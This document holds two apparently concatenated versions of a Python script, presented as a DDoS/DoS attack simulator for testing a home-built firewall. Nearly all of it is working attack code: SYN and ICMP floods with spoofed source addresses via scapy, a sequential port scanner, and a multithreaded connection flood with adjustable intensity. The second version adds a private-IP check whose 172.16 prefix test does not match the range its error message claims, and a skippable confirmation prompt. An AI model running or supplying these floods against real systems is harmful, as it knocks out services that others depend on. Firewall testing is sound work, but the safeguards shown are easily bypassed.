#!/usr/bin/env python3
"""
DDoS/DoS Attack Simulator for testing the firewall
WARNING: Use only for testing your own systems!
"""

import socket
import threading
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, send
import argparse

def syn_flood_attack(target_ip, target_port, duration=10):
    """Simulate SYN flood attack"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        # Random source IP and port
        src_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        
        try:
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")
            break
        
        time.sleep(0.001)  # Small delay to avoid overwhelming

def port_scan_attack(target_ip, duration=10):
    """Simulate port scanning"""
    print(f"Starting port scan on {target_ip} for {duration} seconds")
    end_time = time.time() + duration
    port = 1
    
    while time.time() < end_time and port < 65535:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            port += 1
            time.sleep(0.01)
        except Exception:
            break

def icmp_flood_attack(target_ip, duration=10):
    """Simulate ICMP flood"""
    print(f"Starting ICMP flood on {target_ip} for {duration} seconds")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        # Random source IP
        src_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # Create ICMP packet
        packet = IP(src=src_ip, dst=target_ip) / ICMP()
        
        try:
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")
            break
        
        time.sleep(0.001)

def connection_flood_attack(target_ip, target_port, duration=10):
    """Simulate connection flooding"""
    print(f"Starting connection flood on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    threads = []
    
    def make_connection():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                time.sleep(0.1)
                sock.close()
            except Exception:
                pass
            time.sleep(0.01)
    
    # Start multiple connection threads
    for _ in range(10):
        thread = threading.Thread(target=make_connection)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for completion
    time.sleep(duration)
    for thread in threads:
        thread.join(timeout=1)

def main():
    parser = argparse.ArgumentParser(description='DDoS/DoS Attack Simulator for testing')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('--attack-type', choices=['syn', 'port', 'icmp', 'conn', 'all'], 
                       default='all', help='Type of attack to simulate')
    
    args = parser.parse_args()
    
    print(f"⚠️  WARNING: This will simulate attacks against {args.target_ip}")
    print("   Only use this against systems you own or have permission to test!")
    
    response = input("Continue? (y/N): ")
    if response.lower() != 'y':
        print("Aborted.")
        return
    
    attacks = {
        'syn': lambda: syn_flood_attack(args.target_ip, args.port, args.duration),
        'port': lambda: port_scan_attack(args.target_ip, args.duration),
        'icmp': lambda: icmp_flood_attack(args.target_ip, args.duration),
        'conn': lambda: connection_flood_attack(args.target_ip, args.port, args.duration)
    }
    
    if args.attack_type == 'all':
        print("Running all attack types...")
        for attack_name, attack_func in attacks.items():
            print(f"\n--- Running {attack_name} attack ---")
            try:
                attack_func()
            except KeyboardInterrupt:
                print(f"\n{attack_name} attack interrupted")
                break
            except Exception as e:
                print(f"Error in {attack_name} attack: {e}")
    else:
        print(f"Running {args.attack_type} attack...")
        try:
            attacks[args.attack_type]()
        except KeyboardInterrupt:
            print("\nAttack interrupted")
        except Exception as e:
            print(f"Error: {e}")
    
    print("Attack simulation completed.")

if __name__ == "__main__":
    main()
#!/usr/bin/env python3
"""
DDoS/DoS Attack Simulator for testing the Simple Firewall
Educational and testing purposes only!
"""

import os
import sys
import socket
import threading
import time
import random
import argparse
from typing import Optional
from dataclasses import dataclass

try:
    from scapy.all import IP, TCP, UDP, ICMP, send
except ImportError:
    print("Error: scapy not installed. Run: pip install scapy")
    sys.exit(1)

@dataclass
class AttackConfig:
    """Configuration for attack simulation"""
    target_ip: str
    target_port: int = 80
    duration: int = 30
    intensity: str = "medium"  # low, medium, high
    packets_per_second: int = 100

class AttackSimulator:
    """Main attack simulator class"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'ports_scanned': 0,
            'errors': 0
        }
        self.running = False
    
    def syn_flood_attack(self) -> dict:
        """Simulate SYN flood attack with configurable intensity"""
        print(f"🚀 SYN Flood: {self.config.target_ip}:{self.config.target_port} ({self.config.duration}s)")
        
        end_time = time.time() + self.config.duration
        packets_sent = 0
        
        # Adjust delay based on intensity
        delays = {"low": 0.01, "medium": 0.005, "high": 0.001}
        delay = delays.get(self.config.intensity, 0.005)
        
        while time.time() < end_time and self.running:
            try:
                # Random source IP and port for realistic simulation
                src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                packet = IP(src=src_ip, dst=self.config.target_ip) / \
                        TCP(sport=src_port, dport=self.config.target_port, flags="S")
                
                send(packet, verbose=0)
                packets_sent += 1
                
            except Exception as e:
                self.stats['errors'] += 1
                if self.stats['errors'] > 10:  # Stop if too many errors
                    print(f"❌ Too many errors, stopping: {e}")
                    break
            
            time.sleep(delay)
        
        self.stats['packets_sent'] = packets_sent
        return {"type": "SYN Flood", "packets_sent": packets_sent}
    
    def port_scan_attack(self) -> dict:
        """Simulate port scanning"""
        print(f"🔍 Port Scan: {self.config.target_ip} ({self.config.duration}s)")
        
        end_time = time.time() + self.config.duration
        ports_scanned = 0
        port = 1
        
        while time.time() < end_time and port < 65535 and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.config.target_ip, port))
                sock.close()
                
                ports_scanned += 1
                port += 1
                
                # Vary scanning speed
                delays = {"low": 0.05, "medium": 0.02, "high": 0.01}
                time.sleep(delays.get(self.config.intensity, 0.02))
                
            except Exception:
                self.stats['errors'] += 1
                
        self.stats['ports_scanned'] = ports_scanned
        return {"type": "Port Scan", "ports_scanned": ports_scanned}
    
    def icmp_flood_attack(self) -> dict:
        """Simulate ICMP flood attack"""
        print(f"📡 ICMP Flood: {self.config.target_ip} ({self.config.duration}s)")
        
        end_time = time.time() + self.config.duration
        packets_sent = 0
        
        delays = {"low": 0.01, "medium": 0.005, "high": 0.001}
        delay = delays.get(self.config.intensity, 0.005)
        
        while time.time() < end_time and self.running:
            try:
                src_ip = f"10.0.{random.randint(1,254)}.{random.randint(1,254)}"
                packet = IP(src=src_ip, dst=self.config.target_ip) / ICMP()
                
                send(packet, verbose=0)
                packets_sent += 1
                
            except Exception as e:
                self.stats['errors'] += 1
                if self.stats['errors'] > 10:
                    break
                    
            time.sleep(delay)
        
        return {"type": "ICMP Flood", "packets_sent": packets_sent}
    
    def connection_flood_attack(self) -> dict:
        """Simulate connection flooding"""
        print(f"🔗 Connection Flood: {self.config.target_ip}:{self.config.target_port} ({self.config.duration}s)")
        
        connections_made = 0
        threads = []
        end_time = time.time() + self.config.duration
        
        def make_connections():
            nonlocal connections_made
            while time.time() < end_time and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    connections_made += 1
                    time.sleep(0.1)
                    sock.close()
                except Exception:
                    pass
                time.sleep(0.01)
        
        # Number of threads based on intensity
        thread_counts = {"low": 5, "medium": 10, "high": 20}
        thread_count = thread_counts.get(self.config.intensity, 10)
        
        for _ in range(thread_count):
            thread = threading.Thread(target=make_connections)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        time.sleep(self.config.duration)
        self.running = False
        
        for thread in threads:
            thread.join(timeout=1)
        
        return {"type": "Connection Flood", "connections_made": connections_made}
    
    def run_attack(self, attack_type: str) -> dict:
        """Run a specific attack type"""
        self.running = True
        
        attacks = {
            'syn': self.syn_flood_attack,
            'port': self.port_scan_attack,
            'icmp': self.icmp_flood_attack,
            'conn': self.connection_flood_attack
        }
        
        if attack_type not in attacks:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        try:
            return attacks[attack_type]()
        except KeyboardInterrupt:
            print(f"\n⏹️  Attack interrupted by user")
            self.running = False
            return {"type": attack_type, "status": "interrupted"}
    
    def run_all_attacks(self) -> list:
        """Run all attack types sequentially"""
        results = []
        attack_types = ['syn', 'port', 'icmp', 'conn']
        
        for attack_type in attack_types:
            print(f"\n{'='*50}")
            print(f"Running {attack_type.upper()} attack...")
            print(f"{'='*50}")
            
            try:
                result = self.run_attack(attack_type)
                results.append(result)
                print(f"✅ Completed: {result}")
            except KeyboardInterrupt:
                print(f"\n🛑 All attacks stopped by user")
                break
            except Exception as e:
                print(f"❌ Error in {attack_type} attack: {e}")
                results.append({"type": attack_type, "error": str(e)})
            
            # Brief pause between attacks
            time.sleep(2)
        
        return results

def validate_target_ip(ip: str) -> bool:
    """Validate if IP is safe for testing"""
    # Only allow local/private IP ranges
    safe_ranges = [
        '127.',      # Localhost
        '10.',       # Private Class A
        '172.16.',   # Private Class B (simplified check)
        '192.168.'   # Private Class C
    ]
    
    return any(ip.startswith(prefix) for prefix in safe_ranges)

def main():
    parser = argparse.ArgumentParser(
        description='DDoS/DoS Attack Simulator for Firewall Testing',
        epilog='⚠️  WARNING: Use only on systems you own or have explicit permission to test!'
    )
    
    parser.add_argument('target_ip', help='Target IP address (local/private IPs only)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('--intensity', choices=['low', 'medium', 'high'], default='medium',
                       help='Attack intensity (default: medium)')
    parser.add_argument('--attack-type', choices=['syn', 'port', 'icmp', 'conn', 'all'], 
                       default='all', help='Type of attack to simulate (default: all)')
    parser.add_argument('--no-confirm', action='store_true', help='Skip confirmation prompt')
    
    args = parser.parse_args()
    
    # Validate target IP for safety
    if not validate_target_ip(args.target_ip):
        print(f"❌ Error: {args.target_ip} is not a safe target IP.")
        print("   Only local and private IP addresses are allowed:")
        print("   • 127.x.x.x (localhost)")
        print("   • 10.x.x.x (private)")
        print("   • 172.16.x.x - 172.31.x.x (private)")
        print("   • 192.168.x.x (private)")
        sys.exit(1)
    
    # Check for root privileges (required for raw packet sending)
    if os.geteuid() != 0:
        print("⚠️  Warning: Root privileges recommended for packet crafting.")
        print("   Some attacks may not work properly without sudo.")
    
    # Safety confirmation
    if not args.no_confirm:
        print(f"\n🎯 Target: {args.target_ip}:{args.port}")
        print(f"⏱️  Duration: {args.duration} seconds")
        print(f"⚡ Intensity: {args.intensity}")
        print(f"🚀 Attack Type: {args.attack_type}")
        print("\n⚠️  WARNING: This will simulate network attacks!")
        print("   Only use this against systems you own or have permission to test!")
        
        response = input("\nContinue? (y/N): ")
        if response.lower() != 'y':
            print("Aborted.")
            return
    
    # Create attack configuration
    config = AttackConfig(
        target_ip=args.target_ip,
        target_port=args.port,
        duration=args.duration,
        intensity=args.intensity
    )
    
    # Run attack simulation
    simulator = AttackSimulator(config)
    
    print(f"\n🚀 Starting attack simulation against {args.target_ip}")
    print(f"   Monitor your firewall logs to see detection in action!")
    print(f"   Press Ctrl+C to stop early\n")
    
    try:
        if args.attack_type == 'all':
            results = simulator.run_all_attacks()
            print(f"\n📊 Attack Summary:")
            for result in results:
                print(f"   • {result}")
        else:
            result = simulator.run_attack(args.attack_type)
            print(f"\n📊 Attack Result: {result}")
            
    except KeyboardInterrupt:
        print(f"\n🛑 Attack simulation stopped by user")
    except Exception as e:
        print(f"\n❌ Error during attack simulation: {e}")
    
    print(f"\n✅ Attack simulation completed.")
    print(f"   Check your firewall logs and statistics!")

if __name__ == "__main__":
    main()